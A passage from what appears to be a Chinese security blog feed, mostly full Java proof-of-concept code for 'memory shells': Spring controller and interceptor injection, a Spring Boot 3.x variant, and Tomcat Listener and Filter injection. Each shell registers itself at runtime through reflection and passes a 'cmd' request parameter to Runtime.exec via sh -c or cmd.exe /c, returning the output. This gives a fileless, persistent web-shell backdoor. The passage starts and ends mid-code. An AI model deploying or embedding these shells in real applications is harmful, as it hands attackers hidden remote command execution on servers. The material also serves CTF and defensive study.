class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;;                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;                response.getWriter().write(output);                response.getWriter().flush();            &#125;        &#125;        &#125;    &#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FailController</span> &#123;    <span class="hljs-meta">@RequestMapping(&quot;/control2&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Spring_Controller</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;        System.out.println(<span class="hljs-string">&quot;i am in&quot;</span>);        <span class="hljs-comment">//获取当前上下文环境</span>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);        <span class="hljs-comment">//手动注册Controller</span>        <span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例</span>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);        <span class="hljs-comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Controller_Shell.class.getDeclaredMethod(<span class="hljs-string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);        <span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);        <span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();        <span class="hljs-comment">// 5. 在内存中动态注册 controller</span>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);        r.registerMapping(info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Controller_Shell</span>(), method);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;            <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;                <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;                <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);                <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;                    isLinux = <span class="hljs-literal">false</span>;                &#125;                String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;;                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;                response.getWriter().write(output);                response.getWriter().flush();            &#125;        &#125;    &#125;&#125;</code></pre></div><p>我们的springmvc-servelet.xml文件中一定要手动开启注解驱动<code>&lt;mvc:annotation-driven/&gt;</code>：<br>假如不加上的话，我们controller内存马注入时的第二步获取RequestMappingHandlerMapping会获取不了这个bean</p><p>不过我们利用内存马一般是借助TemplatesImpl加载字节码，是不需要这些注解的</p><h2 id="Interceptor型"><a href="#Interceptor型" class="headerlink" title="Interceptor型"></a>Interceptor型</h2><h3 id="获取上下文-1"><a href="#获取上下文-1" class="headerlink" title="获取上下文"></a>获取上下文</h3><p>这里用上面没有的方法</p><p><code>LiveBeansView</code>这个类是在spring3.2之后才添加进来的，并且spring6（即springboot3.0.2不存在</p><p>也就是只能在spring3.2到spring5能用</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span>java.lang.reflect.Field filed = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>)</span>;<span class="hljs-comment">// 2. 属性被 private 修饰，所以 setAccessible true</span>filed.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<span class="hljs-comment">// 3. 获取一个 ApplicationContext 实例</span>org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator<span class="hljs-literal">()</span>.next<span class="hljs-literal">()</span>;</code></pre></div><h3 id="反射获取adaptedInterceptors属性"><a href="#反射获取adaptedInterceptors属性" class="headerlink" title="反射获取adaptedInterceptors属性"></a>反射获取adaptedInterceptors属性</h3><div class="code-wrapper"><pre><code class="hljs pgsql">org.springframework.web.servlet.<span class="hljs-keyword">handler</span>.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.<span class="hljs-keyword">handler</span>.AbstractHandlerMapping)context.getBean(&quot;requestMappingHandlerMapping&quot;);java.lang.reflect.Field field = org.springframework.web.servlet.<span class="hljs-keyword">handler</span>.AbstractHandlerMapping.<span class="hljs-keyword">class</span>.getDeclaredField(&quot;adaptedInterceptors&quot;);field.setAccessible(<span class="hljs-keyword">true</span>);java.util.ArrayList&lt;<span class="hljs-keyword">Object</span>&gt; adaptedInterceptors = (java.util.ArrayList&lt;<span class="hljs-keyword">Object</span>&gt;)field.<span class="hljs-keyword">get</span>(abstractHandlerMapping);</code></pre></div><h3 id="恶意Interceptor"><a href="#恶意Interceptor" class="headerlink" title="恶意Interceptor"></a>恶意Interceptor</h3><div class="code-wrapper"><pre><code class="hljs pgsql">package com.example.springshell.interceptor;<span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.<span class="hljs-keyword">method</span>.annotation.RequestMappingHandlerMapping;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> testfilter implements HandlerInterceptor &#123;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">boolean</span> preHandle(HttpServletRequest request, HttpServletResponse response, <span class="hljs-keyword">Object</span> <span class="hljs-keyword">handler</span>) throws <span class="hljs-keyword">Exception</span> &#123;        Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;    &#125;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> postHandle(HttpServletRequest request, HttpServletResponse response, <span class="hljs-keyword">Object</span> <span class="hljs-keyword">handler</span>, ModelAndView modelAndView) throws <span class="hljs-keyword">Exception</span> &#123;        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;posthandle&quot;);    &#125;    @Override    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> afterCompletion(HttpServletRequest request, HttpServletResponse response, <span class="hljs-keyword">Object</span> <span class="hljs-keyword">handler</span>, <span class="hljs-keyword">Exception</span> ex) throws <span class="hljs-keyword">Exception</span> &#123;        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;afterhandle&quot;);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs abnf">//将恶意Interceptor添加入adaptedInterceptorsShell_Interceptor shell_interceptor <span class="hljs-operator">=</span> new Shell_Interceptor()<span class="hljs-comment">;</span>adaptedInterceptors.add(shell_interceptor)<span class="hljs-comment">;</span></code></pre></div><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.springshell.controller;<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<span class="hljs-keyword">import</span> com.example.springshell.interceptor.testfilter;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorShell</span> &#123;    <span class="hljs-meta">@RequestMapping(&quot;/addinterceptor&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);        <span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (AbstractHandlerMapping)context.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>);        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);        field.setAccessible(<span class="hljs-literal">true</span>);        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);        <span class="hljs-type">testfilter</span> <span class="hljs-variable">testfilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">testfilter</span>();        adaptedInterceptors.add(testfilter);    &#125;&#125;</code></pre></div><h2 id="springboot3-x内存马（其实是springboot2-7开始"><a href="#springboot3-x内存马（其实是springboot2-7开始" class="headerlink" title="springboot3.x内存马（其实是springboot2.7开始"></a>springboot3.x内存马（其实是springboot2.7开始</h2><p>前文Spring内存马中我们使用的是Spring5.3.2，对应springboot2.6及以下版本</p><p>但是现在SpringBoot已经在3.x版本了，在这种条件下我们该如何去打进内存马呢？</p><h3 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> jakarta.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilShell</span> &#123;    <span class="hljs-meta">@RequestMapping(&quot;/control&quot;)</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Spring_Controller</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException &#123;        System.out.println(<span class="hljs-string">&quot;i am in&quot;</span>);        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);        <span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);        configField.setAccessible(<span class="hljs-literal">true</span>);        RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span>                (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);        <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> Controller_Shell.class.getMethod(<span class="hljs-string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>)                .options(config)                .build();        <span class="hljs-type">Controller_Shell</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Controller_Shell</span>();        mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;            <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;                <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;                <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);                <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;                    isLinux = <span class="hljs-literal">false</span>;                &#125;                String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;;                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;                response.getWriter().write(output);                response.getWriter().flush();            &#125;        &#125;    &#125;&#125;</code></pre></div><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>最大的不同之处在于获取<code>RequestMappingInfo</code>的方法，低版本POC中直接通过<code>new</code>手动创建我们的<code>RequestMappingInfo</code>，而springboot3.x的POC中通过更原始的<code>build()</code>方法去获取:</p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>实际在做ctf题时，通常是通过TemplatesImpl把内存马加载为字节码</p><p>那这样的话，首先要继承<code>AbstractTranslet</code>，其次在恶意函数中不可能直接传入<code>HttpServletRequest request, HttpServletResponse response</code>,要考虑如何获取request和response对象</p><p>从这两个方面对上述poc进行修改即可</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tomcat内存马</title>
    <link href="/2024/02/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2024/02/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="tomcat内存马"><a href="#tomcat内存马" class="headerlink" title="tomcat内存马"></a>tomcat内存马</h1><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><ol><li>获取StandardContext上下文</li><li>实现一个恶意Listener</li><li>通过StandardContext#addApplicationEventListener方法添加恶意Listener</li></ol><h3 id="获取StandardContext上下文"><a href="#获取StandardContext上下文" class="headerlink" title="获取StandardContext上下文"></a>获取StandardContext上下文</h3><div class="code-wrapper"><pre><code class="hljs abnf">Field request <span class="hljs-operator">=</span> req.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>)<span class="hljs-comment">;</span>request.setAccessible(true)<span class="hljs-comment">;</span>Request request1 <span class="hljs-operator">=</span> (Request) request.get(req)<span class="hljs-comment">;</span>StandardContext context <span class="hljs-operator">=</span> (StandardContext) request1.getContext()<span class="hljs-comment">;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>current<span class="hljs-constructor">Thread()</span>.get<span class="hljs-constructor">ContextClassLoader()</span>;StandardContext standardContext = (StandardContext) webappClassLoaderBase.get<span class="hljs-constructor">Resources()</span>.get<span class="hljs-constructor">Context()</span>;</code></pre></div><p>两个方法都可以，并且获取的是同一个<code>StandardContext</code>上下文</p><h3 id="添加Listener"><a href="#添加Listener" class="headerlink" title="添加Listener"></a>添加Listener</h3><div class="code-wrapper"><pre><code class="hljs haxe">context.addApplicationEventListener(<span class="hljs-keyword">new</span> <span class="hljs-type">Shell_Listener</span>());</code></pre></div><h3 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h3><div class="code-wrapper"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt; &lt;%!    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;         <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;           <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();           <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);           <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;               <span class="hljs-keyword">try</span> &#123;                   Runtime.getRuntime().exec(cmd);               &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;                   e.printStackTrace();               &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;                   n.printStackTrace();               &#125;            &#125;        &#125;         <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;        &#125;    &#125;%&gt;&lt;%    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);    reqF.setAccessible(<span class="hljs-literal">true</span>);    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();     <span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();    context.addApplicationEventListener(shell_Listener);%&gt;</code></pre></div><h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><ol><li>获取StandardContext对象</li><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><p>要清楚filterConfigs、filterDefs、filterMaps这三个东西</p><p>filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228170336553.png" alt="image-20240228170336553"></p><p><code>filterDef</code>存放了filter的定义，包括filterClass、filterName等信息。对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p><div class="code-wrapper"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">filter</span>&gt;    &lt;<span class="hljs-keyword">filter</span>-<span class="hljs-type">name</span>&gt;&lt;/<span class="hljs-keyword">filter</span>-<span class="hljs-type">name</span>&gt;    &lt;<span class="hljs-keyword">filter</span>-<span class="hljs-keyword">class</span>&gt;&lt;/<span class="hljs-keyword">filter</span>-<span class="hljs-keyword">class</span>&gt;&lt;/<span class="hljs-keyword">filter</span>&gt;</code></pre></div><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228170448018.png" alt="image-20240228170448018"></p><p><code>filterDefs</code>是一个HashMap，以键值对的形式存储filterDef</p><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228170545416.png" alt="image-20240228170545416"></p><p><code>filterMaps</code>中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<code>&lt;filter-mapping&gt;</code>标签</p><p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240228170626210.png" alt="image-20240228170626210"></p><h3 id="还是获取StandardContext对象"><a href="#还是获取StandardContext对象" class="headerlink" title="还是获取StandardContext对象"></a>还是获取StandardContext对象</h3><p>用前面的好像也行</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-comment">//获取ApplicationContextFacade类</span>ServletContext servletContext = request.get<span class="hljs-constructor">Session()</span>.get<span class="hljs-constructor">ServletContext()</span>; <span class="hljs-comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span>Field appContextField = servletContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;appContextField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext); <span class="hljs-comment">//反射获取ApplicationContext类属性context为StandardContext类</span>Field standardContextField = applicationContext.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;standardContextField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</code></pre></div><h3 id="封装FilterDef"><a href="#封装FilterDef" class="headerlink" title="封装FilterDef"></a>封装FilterDef</h3><div class="code-wrapper"><pre><code class="hljs reasonml">String name = <span class="hljs-string">&quot;CommonFilter&quot;</span>;FilterDef filterDef = <span class="hljs-keyword">new</span> <span class="hljs-constructor">FilterDef()</span>;filterDef.set<span class="hljs-constructor">Filter(<span class="hljs-params">filter</span>)</span>;filterDef.set<span class="hljs-constructor">FilterName(<span class="hljs-params">name</span>)</span>;filterDef.set<span class="hljs-constructor">FilterClass(<span class="hljs-params">filter</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">Name()</span>);standardContext.add<span class="hljs-constructor">FilterDef(<span class="hljs-params">filterDef</span>)</span>;</code></pre></div><h3 id="封装FilterMap"><a href="#封装FilterMap" class="headerlink" title="封装FilterMap"></a>封装FilterMap</h3><div class="code-wrapper"><pre><code class="hljs reasonml">FilterMap filterMap = <span class="hljs-keyword">new</span> <span class="hljs-constructor">FilterMap()</span>;filterMap.add<span class="hljs-constructor">URLPattern(<span class="hljs-string">&quot;/*&quot;</span>)</span>;filterMap.set<span class="hljs-constructor">FilterName(<span class="hljs-params">name</span>)</span>;filterMap.set<span class="hljs-constructor">Dispatcher(DispatcherType.REQUEST.<span class="hljs-params">name</span>()</span>);standardContext.add<span class="hljs-constructor">FilterMapBefore(<span 